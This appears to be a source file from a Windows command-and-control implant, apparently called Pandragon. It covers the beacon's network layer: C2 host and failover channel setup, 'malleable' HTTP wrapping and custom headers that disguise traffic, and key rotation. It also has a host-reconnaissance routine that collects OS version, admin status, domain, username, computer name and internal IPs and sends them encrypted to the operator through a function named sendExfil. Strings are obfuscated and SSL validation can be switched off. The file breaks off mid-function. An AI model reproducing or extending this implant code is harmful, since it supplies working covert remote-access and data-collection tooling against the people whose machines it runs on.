#include "../../include/network/net_abstract.h"
#include "../../include/resolver.h"
#include "../../include/network/transport.h"
#include "../../libs/bastia/bastia.h"
#include "../../include/utils.h"
#include "../../include/config_parser.h"
#include "../../include/pandragon_runtime.h"
#include "../../include/coff/COFFSetup.h"
#include <cstdint>
#include <utility>
#include <cstring>
#include <winsock.h>


/* TODO: simplify thiS MONOLITH.
todo:
Consolidate all scattered globals into one struct:
struct NetworkState {
    functionTable* nt;
    uint8_t* beacon_id;
    uint8_t* crypto_key;
    uint32_t seq_num;
    bool identity_set;
    // C2 config
    wchar_t* host;
    wchar_t* path;
    wchar_t* userAgent;
    uint16_t port;
    bool is_https;
    // Malleable config
    // ... etc
};
Benefit:  easier to swap channels.
2. extract encoding utils to utils.cpp (~130 lines)
- b64UrlEncode() -> base64_url_encode()
- b64UrlDecode() -> base64_url_decode()
- asciiToWide() -> str_to_wide()
Benefit: Reusable elsewhere, reduces net_abstract by ~130 lines.
3. extract string helpers
- buildQueryPath().could stay or move
- Other temp string builders
4. split sendData() into focused functions

Currently does: encrypt, encode, malleable wrap, HTTP encode, send

Extract:
- preparePayload() - handle malleable wrapping + encoding
- applyHttpEncoding() - handle query param / path / body logic
Benefit: Each function has one job, easier to test/modify.
*/
// -- Module-local C2 config -------------------------------------------------
static functionTable* s_ntFt        = nullptr;
static wchar_t*         c2_host        = nullptr;
static wchar_t*         s_path        = nullptr;
static wchar_t*         s_userAgent   = nullptr;
static INTERNET_PORT    s_port         = INTERNET_DEFAULT_HTTPS_PORT;
static bool             s_is_https     = true;
bool                    g_validate_ssl = true;
static uint8_t          s_http_method  = 0;

// -- Beacon state variables -----------------------------------------
static uint8_t* g_beacon_id = nullptr;
static uint32_t g_seq_num = 1;
static uint8_t* g_crypto_key = nullptr;
static bool    g_identity_set = false;
static bool    g_key_rotation_pending = false;

// -- Malleable network configuration ----------------------------------------
static bool    g_malleable_set = false;        // Track if malleable config is set
static char*   g_wrapper_prefix = nullptr;     // Prefix for wrapped payloads (malloc'd)
static char*   g_wrapper_suffix = nullptr;     // Suffix for wrapped payloads (malloc'd)
static uint8_t g_wrapper_prefix_len = 0;       // Length of prefix
static uint8_t g_wrapper_suffix_len = 0;       // Length of suffix

// Custom HTTP headers. linked list
struct HTTP_header_node {
    HTTP_header_node* next;
    char*   name;
    uint8_t name_len;
    char*   value;
    uint8_t value_len;
};
static HTTP_header_node* g_custom_headers = nullptr;  // linked list head
static uint8_t           g_custom_header_count = 0;

// Payload location config (pointer-based)
static uint8_t g_payload_location_type = 0;
static char*   g_payload_param_name = nullptr;
static uint8_t g_payload_param_name_len = 0;
static char*   g_path_prefix = nullptr;
static char*   g_path_suffix = nullptr;
static uint8_t g_path_prefix_len = 0;
static uint8_t g_path_suffix_len = 0;

// -- Helper: Get next sequence number with automatic increment --------------
// Returns current seq_num and automatically increments it (call on every send)
static uint32_t getNextSeqNum() {    
    // Trigger key rotation when approaching wraparound (16 packets before)
    if (g_seq_num >= 0xFFFFFFF0) {
        g_key_rotation_pending = true;
        c_debugPrint(s_ntFt, "[getNextSeqNum] Approaching wraparound (seq=%lu), key rotation pending", 
                     (unsigned long)g_seq_num);
    }
    
    g_seq_num++;
    
    // Handle actual wraparound
    if (g_seq_num == 0) {
        // Wrapped to 0 - this should not happen if key rotation works
        // Force to 1 and ensure key rotation is triggered
        g_seq_num = 1;
        g_key_rotation_pending = true;
        c_debugPrint(s_ntFt, "[getNextSeqNum] Sequence number WRAPPED - key rotation REQUIRED");
    }
    
    return g_seq_num;
}

// Check if key rotation is pending (called from main loop)
bool isKeyRotationPending(void) {
    return g_key_rotation_pending;
}

// Clear key rotation pending flag (called after successful rotation)
void clearKeyRotationPending(void) {
    g_key_rotation_pending = false;
    g_seq_num = 1;  // Reset sequence number after key rotation
    c_debugPrint(s_ntFt, "[clearKeyRotationPending] Key rotation complete, seq_num reset to 1");
}

// -- Function to set beacon identity --------------------------------
void setBeaconIdentity(const uint8_t* beaconID, const uint8_t* cryptoKey) {
    if (beaconID) {
        if (!g_beacon_id) g_beacon_id = (uint8_t*)__malloc(8);
        if (g_beacon_id) __memcpy(g_beacon_id, beaconID, 8);
    }
    if (cryptoKey) {
        if (!g_crypto_key) g_crypto_key = (uint8_t*)__malloc(32);
        if (g_crypto_key) __memcpy(g_crypto_key, cryptoKey, 32);
    }
    // Only mark identity as set if both buffers are valid
    g_identity_set = (g_beacon_id != nullptr) && (g_crypto_key != nullptr);
}

// -- Getter functions for malleable config ----------------------------------

const char* getWrapperPrefix(void) {
    return g_wrapper_prefix ? g_wrapper_prefix : "";
}

const char* getWrapperSuffix(void) {
    return g_wrapper_suffix ? g_wrapper_suffix : "";
}

const char* getCustomHTTPHeader(uint8_t index, uint16_t* name_len, uint16_t* value_len) {
    HTTP_header_node* cur = g_custom_headers;
    uint8_t i = 0;
    while (cur && i < index) {
        cur = cur->next;
        i++;
    }
    if (!cur) {
        if (name_len) *name_len = 0;
        if (value_len) *value_len = 0;
        return NULL;
    }
    if (name_len) *name_len = cur->name_len;
    if (value_len) *value_len = cur->value_len;
    return cur->name;
}

// Helper to get header value by index
const char* getCustomHeaderValue(uint8_t index) {
    HTTP_header_node* cur = g_custom_headers;
    uint8_t i = 0;
    while (cur && i < index) {
        cur = cur->next;
        i++;
    }
    if (!cur) return NULL;
    return cur->value;
}

uint8_t getCustomHTTPHeaderCount(void) {
    return g_custom_header_count;
}

uint8_t getPayloadLocationType(void) {
    return g_payload_location_type;
}

const char* getPayloadParamName(void) {
    return g_payload_param_name ? g_payload_param_name : "";
}

const char* getPathPrefix(void) {
    return g_path_prefix ? g_path_prefix : "";
}

const char* getPathSuffix(void) {
    return g_path_suffix ? g_path_suffix : "";
}

// -- Helper: Clear all malleable config state -------------------------------

static void freeMalleableGlobals() {
    if (g_wrapper_prefix) { __free(g_wrapper_prefix); g_wrapper_prefix = nullptr; }
    if (g_wrapper_suffix) { __free(g_wrapper_suffix); g_wrapper_suffix = nullptr; }
    g_wrapper_prefix_len = 0;
    g_wrapper_suffix_len = 0;

    HTTP_header_node* cur = g_custom_headers;
    while (cur) {
        HTTP_header_node* next = cur->next;
        if (cur->name) __free(cur->name);
        if (cur->value) __free(cur->value);
        __free(cur);
        cur = next;
    }
    g_custom_headers = nullptr;
    g_custom_header_count = 0;

    if (g_payload_param_name) { __free(g_payload_param_name); g_payload_param_name = nullptr; }
    if (g_path_prefix) { __free(g_path_prefix); g_path_prefix = nullptr; }
    if (g_path_suffix) { __free(g_path_suffix); g_path_suffix = nullptr; }
    g_payload_param_name_len = 0;
    g_path_prefix_len = 0;
    g_path_suffix_len = 0;
    g_payload_location_type = 0;
}

// -- Helper: Set malleable config from a PCFG_ChannelMalleable -
static void applyMalleableFrom(const PCFG_ChannelMalleable* cm) {
    if (!cm) return;

    freeMalleableGlobals();
    g_malleable_set = true;

    // Copy wrapper prefix
    if (cm->wrapper_prefix && cm->wrapper_prefix_len > 0) {
        g_wrapper_prefix = (char*)__malloc(cm->wrapper_prefix_len + 1);
        if (g_wrapper_prefix) {
            __memcpy(g_wrapper_prefix, cm->wrapper_prefix, cm->wrapper_prefix_len);
            g_wrapper_prefix[cm->wrapper_prefix_len] = '\0';
        }
    }
    g_wrapper_prefix_len = cm->wrapper_prefix_len;

    // Copy wrapper suffix
    if (cm->wrapper_suffix && cm->wrapper_suffix_len > 0) {
        g_wrapper_suffix = (char*)__malloc(cm->wrapper_suffix_len + 1);
        if (g_wrapper_suffix) {
            __memcpy(g_wrapper_suffix, cm->wrapper_suffix, cm->wrapper_suffix_len);
            g_wrapper_suffix[cm->wrapper_suffix_len] = '\0';
        }
    }
    g_wrapper_suffix_len = cm->wrapper_suffix_len;

    c_debugPrint(s_ntFt, "Wrapper: prefix='%s' (len=%u) suffix='%s' (len=%u)",
                 g_wrapper_prefix ? g_wrapper_prefix : "", (unsigned)g_wrapper_prefix_len,
                 g_wrapper_suffix ? g_wrapper_suffix : "", (unsigned)g_wrapper_suffix_len);

    // Copy HTTP headers (linked list: config_parser's HTTP_header -> net_abstract's HTTP_header_node)
    const HTTP_header* cfgHdr = cm->headers;
    HTTP_header_node* tail = nullptr;
    g_custom_header_count = 0;

    while (cfgHdr && g_custom_header_count < 255) {
        HTTP_header_node* node = (HTTP_header_node*)__malloc(sizeof(HTTP_header_node));
        if (!node) break;
        node->next = nullptr;

        if (cfgHdr->header && cfgHdr->headerLen > 0) {
            node->name = (char*)__malloc(cfgHdr->headerLen + 1);
            if (node->name) {
                __memcpy(node->name, cfgHdr->header, cfgHdr->headerLen);
                node->name[cfgHdr->headerLen] = '\0';
            }
        } else {
            node->name = nullptr;
        }
        node->name_len = cfgHdr->headerLen;

        if (cfgHdr->value && cfgHdr->valueLen > 0) {
            node->value = (char*)__malloc(cfgHdr->valueLen + 1);
            if (node->value) {
                __memcpy(node->value, cfgHdr->value, cfgHdr->valueLen);
                node->value[cfgHdr->valueLen] = '\0';
            }
        } else {
            node->value = nullptr;
        }
        node->value_len = cfgHdr->valueLen;

        c_debugPrint(s_ntFt, "Header %u: %s: %s", (unsigned)g_custom_header_count,
                     node->name ? node->name : "(null)",
                     node->value ? node->value : "(null)");

        if (!g_custom_headers) {
            g_custom_headers = node;
            tail = node;
        } else {
            tail->next = node;
            tail = node;
        }
        g_custom_header_count++;
        cfgHdr = cfgHdr->next;
    }

    // Copy payload location (real struct, no offset tricks)
    g_payload_location_type = cm->payload_location.type;

    if (cm->payload_location.param_name && cm->payload_location.param_name_len > 0) {
        g_payload_param_name = (char*)__malloc(cm->payload_location.param_name_len + 1);
        if (g_payload_param_name) {
            __memcpy(g_payload_param_name, cm->payload_location.param_name, cm->payload_location.param_name_len);
            g_payload_param_name[cm->payload_location.param_name_len] = '\0';
        }
    }
    g_payload_param_name_len = cm->payload_location.param_name_len;

    if (cm->payload_location.path_prefix && cm->payload_location.path_prefix_len > 0) {
        g_path_prefix = (char*)__malloc(cm->payload_location.path_prefix_len + 1);
        if (g_path_prefix) {
            __memcpy(g_path_prefix, cm->payload_location.path_prefix, cm->payload_location.path_prefix_len);
            g_path_prefix[cm->payload_location.path_prefix_len] = '\0';
        }
    }
    g_path_prefix_len = cm->payload_location.path_prefix_len;

    if (cm->payload_location.path_suffix && cm->payload_location.path_suffix_len > 0) {
        g_path_suffix = (char*)__malloc(cm->payload_location.path_suffix_len + 1);
        if (g_path_suffix) {
            __memcpy(g_path_suffix, cm->payload_location.path_suffix, cm->payload_location.path_suffix_len);
            g_path_suffix[cm->payload_location.path_suffix_len] = '\0';
        }
    }
    g_path_suffix_len = cm->payload_location.path_suffix_len;

    c_debugPrint(s_ntFt, "Location type=%u, param_name='%s'",
                 (unsigned)g_payload_location_type,
                 g_payload_param_name ? g_payload_param_name : "");
}

// -- Helper function to set malleable config from parsed BeaconConfig -------

void setMalleableConfigFromBeaconConfig(const void* beaconConfig) {
    if (!beaconConfig) {
        c_debugPrint(s_ntFt, "[setMalleableConfigFromBeaconConfig] beaconConfig is NULL!");
        return;
    }

    const BeaconConfig* cfg = static_cast<const BeaconConfig*>(beaconConfig);
    c_debugPrint(s_ntFt, "[setMalleableConfigFromBeaconConfig] has_malleable_config=%u", (unsigned)cfg->has_malleable_config);
    
    if (!cfg->has_malleable_config) {
        g_malleable_set = false;
        c_debugPrint(s_ntFt, "No malleable config present");
        return;
    }

    c_debugPrint(s_ntFt, "Malleable config found!");
    c_debugPrint(s_ntFt, "[setMalleableConfigFromBeaconConfig] global wrapper: prefix_len=%u, suffix_len=%u",
        (unsigned)cfg->global_malleable.wrapper_prefix_len,
        (unsigned)cfg->global_malleable.wrapper_suffix_len);

    applyMalleableFrom(&cfg->global_malleable);
}

// -- Clear all malleable config state ---------------------------------------

void clearMalleableConfig(void) {
    freeMalleableGlobals();
    g_malleable_set = false;
    c_debugPrint(s_ntFt, "Malleable config cleared (bare/TCP channel)");
}

// -- Set malleable config from a per-channel PCFG_ChannelMalleable ----------

void setMalleableFromChannelMalleable(const PCFG_ChannelMalleable* chMalleable) {
    if (!chMalleable) {
        clearMalleableConfig();
        return;
    }
    applyMalleableFrom(chMalleable);
}

// -- Set active C2 channel: switch host + resolve malleable ----------------

void setActiveChannel(uint8_t channelIndex, const void* config) {
    if (!config) return;

    // Forward to NetworkManager. this is the thin wrapper.
    // The real implementation is in managers.cpp which has access to
    // the full BeaconConfig and can resolve malleable per-channel.
    // This function is here for API compatibility; managers.cpp overrides it.
    c_debugPrint(s_ntFt, "[setActiveChannel] channelIndex=%u (implemented in NetworkManager)",
                 (unsigned)channelIndex);
}

bool initNetworkTable(functionTable* ntFt) {
    if (!ntFt) return false;
    s_ntFt = ntFt;
    return true;
}

// Set channel security mode (HTTPS vs HTTP)
void setChannelSecure(bool isHttps) {
    s_is_https = isHttps;
}

// Get channel security mode
bool isChannelSecure(void) {
    return s_is_https;
}

// Set SSL certificate validation mode (true = validate, false = ignore errors)
void setValidateSSL(bool validate) {
    g_validate_ssl = validate;
}

// Set HTTP method for data transmission (0=GET, 1=POST)
void setHttpMethod(uint8_t method) {
    s_http_method = method;
}

// Get current HTTP method
uint8_t getHttpMethod(void) {
    return s_http_method;
}

void initNetwork(functionTable* ntFt,
                const wchar_t*   host,
                const wchar_t*   checkInPath,
                const wchar_t* userAgent,
                INTERNET_PORT    port)
{
    // Free existing allocations
    if (c2_host) { __free(c2_host); c2_host = nullptr; }
    if (s_path) { __free(s_path); s_path = nullptr; }
    if (s_userAgent) { __free(s_userAgent); s_userAgent = nullptr; }

    // Allocate and copy strings
    if (host) {
        size_t len = __wcslen(host) + 1;
        c2_host = (wchar_t*)__malloc(len * sizeof(wchar_t));
        if (c2_host) __memcpy(c2_host, host, len * sizeof(wchar_t));
    }

    if (checkInPath) {
        size_t len = __wcslen(checkInPath) + 1;
        s_path = (wchar_t*)__malloc(len * sizeof(wchar_t));
        if (s_path) __memcpy(s_path, checkInPath, len * sizeof(wchar_t));
    }

    if (userAgent) {
        size_t len = __wcslen(userAgent) + 1;
        s_userAgent = (wchar_t*)__malloc(len * sizeof(wchar_t));
        if (s_userAgent) __memcpy(s_userAgent, userAgent, len * sizeof(wchar_t));
    }

    // Store port
    s_port = port ? port : INTERNET_DEFAULT_HTTPS_PORT;
    s_ntFt = ntFt;
}

// -- switchChannel -----------------------------------------------------
// Switch to a different C2 channel (for failover)
bool switchChannel(const wchar_t* host,
                   const wchar_t* path,
                   const wchar_t* userAgent,
                   INTERNET_PORT    port,
                   uint8_t          http_method)
{
    if (!host || !path || !userAgent) {
        c_debugPrint(s_ntFt, "[switchChannel] NULL parameters");
        return false;
    }

    // Free existing and allocate new
    if (c2_host) { __free(c2_host); c2_host = nullptr; }
    if (s_path) { __free(s_path); s_path = nullptr; }
    if (s_userAgent) { __free(s_userAgent); s_userAgent = nullptr; }

    // Clear stale malleable config from previous channel
    clearMalleableConfig();

    size_t len = __wcslen(host) + 1;
    c2_host = (wchar_t*)__malloc(len * sizeof(wchar_t));
    if (!c2_host) return false;
    __memcpy(c2_host, host, len * sizeof(wchar_t));

    len = __wcslen(path) + 1;
    s_path = (wchar_t*)__malloc(len * sizeof(wchar_t));
    if (!s_path) { __free(c2_host); c2_host = nullptr; return false; }
    __memcpy(s_path, path, len * sizeof(wchar_t));

    len = __wcslen(userAgent) + 1;
    s_userAgent = (wchar_t*)__malloc(len * sizeof(wchar_t));
    if (!s_userAgent) {
        __free(c2_host); c2_host = nullptr;
        __free(s_path); s_path = nullptr;
        return false;
    }
    __memcpy(s_userAgent, userAgent, len * sizeof(wchar_t));

    // Store port
    s_port = port;

    // Store HTTP method
    s_http_method = http_method;

    c_debugPrint(s_ntFt, "[switchChannel] Switched to %ls:%d%ls (HTTP method: %s)", host, port, path, http_method == 1 ? "POST" : "GET");
    return true;
}

// -- gatherSystemInfo ------------------------------------------------
// Collect system information into a binary payload for the first check-in.
//
// Binary layout (all fields packed, strings are variable-length UTF-8):
//   [4] os_major        (PEB->OSMajorVersion)
//   [4] os_minor        (PEB->OSMinorVersion)
//   [4] os_build        (PEB->OSBuildNumber)
//   [2] arch            (IMAGE_FILE_MACHINE_*)
//   [1] is_wow64
//   [1] is_elevated     (TokenElevation)
//   [1] is_domain_joined (ComputerNameDnsDomain succeeds with non-empty result)
//   [4] pid
//   [2] process_name_len
//   [..] process_name
//   [2] username_len
//   [..] username
//   [2] computer_name_len
//   [..] computer_name
//   [2] domain_len
//   [..] domain
//   [4] ram_mb
//   [1] cpu_cores
//   [1] ip_count
//   [..] ip_count * { [1] len, [len] addr }  (dotted-decimal UTF-8)
//
// Returns a heap-allocated buffer (caller must __free), or NULL on failure.
// Sets *out_len to the total byte count.
char* gatherSystemInfo(size_t* out_len) {
    if (!s_ntFt || !out_len) return nullptr;

    // -- Temporary wide-string buffers --
    const size_t WBUF_MAX = 512;
    wchar_t* tmp_w = (wchar_t*)__malloc(WBUF_MAX * sizeof(wchar_t));
    if (!tmp_w) return nullptr;

    // -- Read OS version directly from PEB (no API call needed) --
    #ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
    #else
        PPEB peb = (PPEB)__readfsdword(0x30);
    #endif
    uint32_t os_major = (uint32_t)peb->OSMajorVersion;
    uint32_t os_minor = (uint32_t)peb->OSMinorVersion;
    uint32_t os_build = (uint32_t)peb->OSBuildNumber;

    // -- Architecture --
    SYSTEM_INFO si = {};
    s_ntFt->GetSystemInfo(&si);
    auto arch = (uint16_t)si.wProcessorArchitecture;
    auto cpu_cores = (uint8_t)peb->NumberOfProcessors;

    // -- WoW64 --
    uint8_t is_wow64 = 0;
    if (s_ntFt->IsWow64Process) {
        int wow64 = 0;  // Use int directly to avoid BOOL type issues
        if (s_ntFt->IsWow64Process(NtCurrentProcess(), (PBOOL)&wow64)) {
            is_wow64 = (uint8_t)(wow64 ? 1 : 0);
        }
    }

    // -- Token Elevation (admin check) --
    // maybe this is better as a bof...
    uint8_t is_elevated = 0;
    REQUIRES_MODULE(s_ntFt, ModuleCache::MOD_ADVAPI32);
    if (s_ntFt->OpenProcessToken && s_ntFt->GetTokenInformation) {
        HANDLE hToken = NULL;
        if (s_ntFt->OpenProcessToken((HANDLE)-1, TOKEN_QUERY /* TOKEN_QUERY */, &hToken)) {
            TOKEN_ELEVATION te;
            DWORD retLen = 0;
            if (s_ntFt->GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)TokenElevation /* TokenElevation */, &te, sizeof(te), &retLen)) {
                is_elevated = (uint8_t)(te.TokenIsElevated ? 1 : 0);
            }
            s_ntFt->NtClose(hToken);
        }
    }

    // -- Domain-joined detection --
    uint8_t is_domain_joined = 0;
    DWORD domain_len_w = WBUF_MAX;
    {
        if (s_ntFt->GetComputerNameExW((COMPUTER_NAME_FORMAT)ComputerNameDnsDomain, tmp_w, &domain_len_w)) {
            if (domain_len_w > 0 && tmp_w[0] != L'\0') {
                is_domain_joined = 1;
            }
        }
    }

    // -- PID --
    uint32_t pid = (uint32_t)(uintptr_t)__getCurrentProcessID();

    // -- Process name. convert to UTF-8 via __wcstombs
    DWORD proc_name_len = WBUF_MAX;
    char* proc_name_utf8 = nullptr;
    size_t proc_name_len_utf8 = 0;
    {
        // Extract just the filename from ImagePathName (strip path)
        const wchar_t* imgPath = peb->ProcessParameters->ImagePathName.Buffer;
        size_t imgPathLen = peb->ProcessParameters->ImagePathName.Length / sizeof(wchar_t);
        const wchar_t* proc_basename = imgPath;
        for (size_t i = 0; i < imgPathLen; i++) {
            if (imgPath[i] == L'\\' || imgPath[i] == L'/') {
                proc_basename = imgPath + i + 1;
            }
        }
        size_t wlen = __wcslen(proc_basename);
        size_t max_out = wlen * 3 + 1;  // UTF-8 worst case
        proc_name_utf8 = (char*)__malloc(max_out);
        if (proc_name_utf8) {
            __wcstombs(proc_name_utf8, proc_basename, max_out);
            proc_name_len_utf8 = __strlen(proc_name_utf8);
        }
    }
    if (!proc_name_utf8) {
        proc_name_utf8 = (char*)__malloc(1);
        if (proc_name_utf8) proc_name_utf8[0] = '\0';
    }

    // -- Username --
    DWORD user_len = WBUF_MAX;
    char* username_utf8 = nullptr;
    size_t username_len_utf8 = 0;
    if (s_ntFt->GetUserNameW(tmp_w, &user_len)) {
        size_t wlen = __wcslen(tmp_w);
        size_t max_out = wlen * 3 + 1;
        username_utf8 = (char*)__malloc(max_out);
        if (username_utf8) {
            __wcstombs(username_utf8, tmp_w, max_out);
            username_len_utf8 = __strlen(username_utf8);
        }
    }
    if (!username_utf8) {
        username_utf8 = (char*)__malloc(1);
        if (username_utf8) username_utf8[0] = '\0';
    }

    // -- Computer name --
    DWORD comp_name_len = WBUF_MAX;
    char* compname_utf8 = nullptr;
    size_t compname_len_utf8 = 0;
    if (s_ntFt->GetComputerNameW(tmp_w, &comp_name_len)) {
        size_t wlen = __wcslen(tmp_w);
        size_t max_out = wlen * 3 + 1;
        compname_utf8 = (char*)__malloc(max_out);
        if (compname_utf8) {
            __wcstombs(compname_utf8, tmp_w, max_out);
            compname_len_utf8 = __strlen(compname_utf8);
        }
    }
    if (!compname_utf8) {
        compname_utf8 = (char*)__malloc(1);
        if (compname_utf8) compname_utf8[0] = '\0';
    }

    // -- Domain name
    wchar_t* domain_w = (wchar_t*)__malloc(WBUF_MAX * sizeof(wchar_t));
    char* domain_utf8 = nullptr;
    size_t domain_len_utf8 = 0;
    if (domain_w) {
        if (s_ntFt->GetComputerNameExW) {
            DWORD dns_domain_len = WBUF_MAX;
            if (s_ntFt->GetComputerNameExW((COMPUTER_NAME_FORMAT)2 /* ComputerNameDnsDomain */, domain_w, &dns_domain_len)) {
                size_t wlen = __wcslen(domain_w);
                size_t max_out = wlen * 3 + 1;
                domain_utf8 = (char*)__malloc(max_out);
                if (domain_utf8) {
                    __wcstombs(domain_utf8, domain_w, max_out);
                    domain_len_utf8 = __strlen(domain_utf8);
                }
            }
        }
    }
    if (!domain_utf8) {
        domain_utf8 = (char*)__malloc(1);
        if (domain_utf8) domain_utf8[0] = '\0';
    }
    if (domain_w) __free(domain_w);
    domain_w = NULL;

    // -- RAM (MB) --
    uint32_t ram_mb = 0;
    {
        MEMORYSTATUSEX ms = {};
        ms.dwLength = sizeof(ms);
        if (s_ntFt->GlobalMemoryStatusEx(&ms)) {
            ram_mb = (uint32_t)(ms.ullTotalPhys / (1024 * 1024));
        }
    }

    // -- Internal IPs --
    // Collect IPv4 addresses (skip loopback, link-local, APIPA).
    struct IpEntry {
        char addr[16];  // "255.255.255.255\0". This will DEFINITELY overflow if we try to put IPv6 in here, but the spec is for IPv4 only so... tough luck.
                        // Honestly don't think i'll fix it, but a very, very funny problem nonetheless.
                        //                                                                      - Serexp
        uint8_t len;
    };
    IpEntry* ips = (IpEntry*)__malloc(16 * sizeof(IpEntry));  // max 16 IPs
    uint8_t ip_count = 0;

    REQUIRES_MODULE(s_ntFt, ModuleCache::MOD_IPHLPAPI);
    if (s_ntFt->GetAdaptersAddresses && ips) {
        ULONG buf_len = 15 * 1024;  // 15 KB should be enough
        PIP_ADAPTER_ADDRESSES adapters = (PIP_ADAPTER_ADDRESSES)__malloc(buf_len);
        if (adapters) {
            ULONG res = s_ntFt->GetAdaptersAddresses(
                AF_INET /* AF_INET */,
                0x0004 | 0x0002, /* GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST */
                NULL,
                adapters,
                &buf_len
            );
            if (res == 0 /* NO_ERROR */) {
                for (PIP_ADAPTER_ADDRESSES adap = adapters; adap && ip_count < 16; adap = adap->Next) {
                    // Skip loopback
                    if (adap->IfType == 24 /* IF_TYPE_SOFTWARE_LOOPBACK */) continue;

                    for (PIP_ADAPTER_UNICAST_ADDRESS_LH uc = adap->FirstUnicastAddress; uc && ip_count < 16; uc = uc->Next) {
                        /* i honestly forgot what this code does but it works so glhf */
                        if (uc->Address.lpSockaddr && uc->Address.iSockaddrLength >= sizeof(SOCKADDR_IN)) {
                            SOCKADDR_IN* sin = (SOCKADDR_IN*)uc->Address.lpSockaddr;
                            uint32_t ip32 = sin->sin_addr.S_un.S_addr;
                            // Skip 127.0.0.0/8, 169.254.0.0/16 (APIPA), 0.0.0.0
                            uint8_t b0 = (uint8_t)(ip32 & 0xFF);
                            uint8_t b1 = (uint8_t)((ip32 >> 8) & 0xFF);
                            if (b0 == 127 || b0 == 0) continue;
                            if (b0 == 169 && b1 == 254) continue;

                            IpEntry* e = &ips[ip_count];
                            e->len = (uint8_t)__snprintf(e->addr, sizeof(e->addr), lcg_encrypt("%u.%u.%u.%u"),
                                b0, b1,
                                (uint8_t)((ip32 >> 16) & 0xFF),
                                (uint8_t)((ip32 >> 24) & 0xFF));
                            if (e->len > 0 && e->len < sizeof(e->addr)) {
                                ip_count++;
                            }
                        }
                    }
                }
            }
            __free(adapters);
        }
    }

    // Calculate total size
    size_t total = 4+4+4 + 2+1+1+1 + 4  // fixed fields
                 + 2 + proc_name_len_utf8
                 + 2 + username_len_utf8
                 + 2 + compname_len_utf8
                 + 2 + domain_len_utf8
                 + 4 + 1  // ram_mb, cpu_cores
                 + 1;     // ip_count
    for (uint8_t i = 0; i < ip_count; i++) {
        total += 1 + ips[i].len;
    }

    char* payload = (char*)__malloc(total);
    if (!payload) {
        if (proc_name_utf8) __free(proc_name_utf8);
        if (username_utf8) __free(username_utf8);
        if (compname_utf8) __free(compname_utf8);
        if (domain_utf8) __free(domain_utf8);
        if (ips) __free(ips);
        if (domain_w) __free(domain_w);
        if (tmp_w) __free(tmp_w);
        *out_len = 0;
        return nullptr;
    }

    // Serialize
    size_t off = 0;
    __memcpy(payload + off, &os_major, 4); off += 4;
    __memcpy(payload + off, &os_minor, 4); off += 4;
    __memcpy(payload + off, &os_build, 4); off += 4;
    __memcpy(payload + off, &arch, 2); off += 2;
    __memcpy(payload + off, &is_wow64, 1); off += 1;
    __memcpy(payload + off, &is_elevated, 1); off += 1;
    __memcpy(payload + off, &is_domain_joined, 1); off += 1;
    __memcpy(payload + off, &pid, 4); off += 4;

    uint16_t len16 = (uint16_t)proc_name_len_utf8;
    __memcpy(payload + off, &len16, 2); off += 2;
    if (proc_name_len_utf8) { __memcpy(payload + off, proc_name_utf8, proc_name_len_utf8); off += proc_name_len_utf8; }

    len16 = (uint16_t)username_len_utf8;
    __memcpy(payload + off, &len16, 2); off += 2;
    if (username_len_utf8) { __memcpy(payload + off, username_utf8, username_len_utf8); off += username_len_utf8; }

    len16 = (uint16_t)compname_len_utf8;
    __memcpy(payload + off, &len16, 2); off += 2;
    if (compname_len_utf8) { __memcpy(payload + off, compname_utf8, compname_len_utf8); off += compname_len_utf8; }

    len16 = (uint16_t)domain_len_utf8;
    __memcpy(payload + off, &len16, 2); off += 2;
    if (domain_len_utf8) { __memcpy(payload + off, domain_utf8, domain_len_utf8); off += domain_len_utf8; }

    __memcpy(payload + off, &ram_mb, 4); off += 4;
    __memcpy(payload + off, &cpu_cores, 1); off += 1;
    __memcpy(payload + off, &ip_count, 1); off += 1;
    for (uint8_t i = 0; i < ip_count; i++) {
        __memcpy(payload + off, &ips[i].len, 1); off += 1;
        __memcpy(payload + off, ips[i].addr, ips[i].len); off += ips[i].len;
    }

    *out_len = total;

    // Cleanup temporaries
    if (proc_name_utf8) __free(proc_name_utf8);
    if (username_utf8) __free(username_utf8);
    if (compname_utf8) __free(compname_utf8);
    if (domain_utf8) __free(domain_utf8);
    if (ips) __free(ips);
    /* domain_w already freed inline at ~line 518 */
    if (tmp_w) __free(tmp_w);

    return payload;
}

// -- sendCheckin -----------------------------------------------------
// Send initial check-in with BEACON_CHECK_IN opcode
bool sendCheckin(const char* sysinfo, size_t sysinfo_len) {
    c_VERBOSE(s_ntFt, "[sendCheckin] ENTER: s_ntFt=%p, g_identity_set=%d, sysinfo=%p, sysinfo_len=%zu",
                 (void*)s_ntFt, (int)g_identity_set, (const void*)sysinfo, sysinfo_len);
    
    if (!s_ntFt || !g_identity_set) {
        c_debugPrint(s_ntFt, "[sendCheckin] Early return: s_ntFt=%p, g_identity_set=%d", (void*)s_ntFt, (int)g_identity_set);
        return false;
    }


    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(s_ntFt, nonce)) {
        c_debugPrint(s_ntFt, "[sendCheckin] CSPRNG failed - aborting packet\n");
        return false;
    }

    // Use sysinfo if provided, otherwise send empty payload
    const uint8_t* payload = sysinfo ? reinterpret_cast<const uint8_t*>(sysinfo) : nullptr;
    size_t payload_len = sysinfo_len;

    c_debugPrint(s_ntFt, "[sendCheckin] Serializing check-in packet...");
    // Serialize the packet with encryption (with PKCS#7 padding if enabled)
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_beacon_id,
        pandragon::b2s_opcode::BEACON_CHECK_IN,
        getNextSeqNum(),
        nonce,
        payload,
        payload_len,
        g_crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    if (packet_result.first == pandragon::parse_err::OK) {
        c_VERBOSE(s_ntFt, "[sendCheckin] Packet serialized: %zu bytes, sending via sendExfil...", packet_result.second.second);
        // Send the complete packet to configured check-in endpoint
        bool result = sendExfil(packet_result.second.first, packet_result.second.second, s_path);
        c_VERBOSE(s_ntFt, "[sendCheckin] sendExfil returned: %d", (int)result);
        // Clean up allocated packet buffer
        __free(packet_result.second.first);
        return result;
    }

    c_debugPrint(s_ntFt, "[sendCheckin] serializePacket failed: %d", (int)packet_result.first);
    return false;
}

// -- Helpers ------------------------------------------------

// ASCII upcast: only valid for base64/URL-safe output (all < 128).
static wchar_t* asciiToWide(const char* narrow, size_t len) {
    wchar_t* wide = (wchar_t*)__malloc((len + 1) * sizeof(wchar_t));
    if (!wide) return NULL;
